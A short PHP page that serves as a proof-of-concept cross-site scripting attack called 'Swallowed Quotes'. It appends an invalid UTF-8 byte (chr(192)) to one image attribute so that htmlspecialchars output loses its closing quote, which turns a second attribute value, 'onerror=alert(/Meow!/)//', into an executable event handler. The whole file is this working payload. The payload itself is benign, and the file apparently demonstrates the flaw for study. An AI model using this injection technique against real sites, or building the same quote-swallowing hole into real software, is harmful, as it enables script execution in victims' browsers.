<?php header('Content-Type: text/html; charset=UTF-8'); ?>
<!DOCTYPE html>
<?php
/**
 * You could also subsititute \xC0 or any other impacted character
 * above ASCII number 192
 */
$input1 = 'fakeimage'.chr(192);
$input2 = <<<INPUT2
onerror=alert(/Meow!/)//
INPUT2;
$output1 = htmlspecialchars($input1, ENT_QUOTES);
$output2 = htmlspecialchars($input2, ENT_QUOTES);
?>
<html>
<head>
    <title>Swallowed Quotes</title>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
</head>
<body>
    <div>
        <img src="http://example.com/images/<?php echo $output1 ?>"
        title="<?php echo $output2 ?>">
    </div>
</body>
</html>